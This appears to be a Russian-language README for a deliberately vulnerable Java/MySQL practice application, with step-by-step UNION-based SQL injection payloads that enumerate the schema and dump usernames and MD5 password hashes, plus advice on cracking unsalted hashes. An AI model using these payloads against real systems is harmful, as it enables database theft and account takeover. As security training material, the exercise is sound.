# SQLInjectionsAndHashPractise
Проект для практики по SQL 
инъекциям и расшифровки паролей, 
представленных в виде хешей.

Для запуска данного проекта потребуется:

1) Любая среда разработки под Java (JDK и JRE, версия java 7 и старше)
2) БД MySQL (использовавлась версия 5.6)
3) Любой apllication server (Для запуска использовался контейнер сервлетов Tomcat версии 8.0.18)

Подготовительный этап:

Перед запуском приложения необходимо испортировать схему в БД MySQL. Файл injection_practise_db_dump.sql.

Запуск и работа с прложением:

После запуска приложения переходим на localhost с указанием порта, на который мы развернули application server (или servlet's 
container). После открытия главной страницы приложения переходим по ссылке Example 1: Login form видим форму, предназначенную
для входа пользователя. Известно, что есть пользователь с логином user и паролем password, за которого можно войти в 
приложение и убедиться в его работоспособности (сообщение "Hello, user! Log out").

Задача:

Данная форма уязвима к SQL инъекциям. С их помощью следует получить список всех пользователей и хеши их паролей.
Далее необходимо определить пароль пользователя "admin" и войти в систему как администратор.

Возможный алгоритм решения:

  SQL инъекции:
  
	1)  Проверим наличие уязвимости к SQL инъекциям. (Ввести символ ' в поле Username, чтобы увидеть сообщение об ошибке);
	2)  Написать вилидный SQL запрос (чтобы не было сообщения об SQL ошибке, например a' or '1' = ' )
	3)  Подбираем количество столбцов с помощью чисел: 
	
    	a' union select 1 from information_schema.TABLES where '1' = '1' or '1' = '
    	a' union select 1,2 from information_schema.TABLES where '1' = '1' or '1' = '
    	a' union select 1,2,3 from information_schema.TABLES where '1' = '1' or '1' = '
    	
  4)  Попробовать узнать прочую информацию:
    	
    	a' union select 1,version(),3 from users where '1' = '1' or '1' = '
    	a' union select 1,user(),3 from users where '1' = '1' or '1' = '
    	a' union select 1,database(),3 from users where '1' = '1' or '1' = '
	
	5)  Зная название базы узнаем названием таблиц в ней:
	    a' union SELECT 1,TABLE_NAME,3 from information_schema.TABLES WHERE TABLE_SCHEMA = 'md5practise' or '1' = '
  6)  Теперь надо узнать имена столбцов:
	    a' union SELECT 1,group_concat(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'md5practise' AND TABLE_NAME = 'users' or '1' = '
	7)  Пытаемся получить содержимое таблицы users: 
	    a' union select 1,2,3 from users where '1' = '1' or '1' = '
	8) Теперь можно достать информацию из базы о пользователе: 
    	
    	a' union select 1,nick,3 from users where '1' = '1' or '1' = '
    	a' union select 1,username,3 from users where '1' = '1' or '1' = '
    	a' union select 1,password,3 from users where '1' = '1' or '1' = '
	
	Прочие примеры:
	
	    Можно экспериментировать с условиями:
    	
    	a' union select 1,username,3 from users where id_user = 1 or '1' = '
    	a' union select 1,username,3 from users where id_user = 1 or true -- 
    	a' union select 1,username,3 from users where id_user = 1 or true --  
      
      Объединить несколько полей в одном:
	    a' union select 1,group_concat(concat(username, 0x3a, password)),3 from users where '1' = '1' or '1' = '
	
  Определение пароля по значению хеш функции:
  
  Для определения пароля по его хеш функции следует:
  
  1) Определить, каким алгоритмом захеширован пароль (Подсказка: в данной работе использовавлся алгоритм md5 (без "соли"))
  2) Попробовать поискать хеш по базам хешей, например: http://www.md5online.org/md5-decrypt.html 
  3) Полный перебор (Например, программа Bars: http://3.14.by/ru/md5)
  
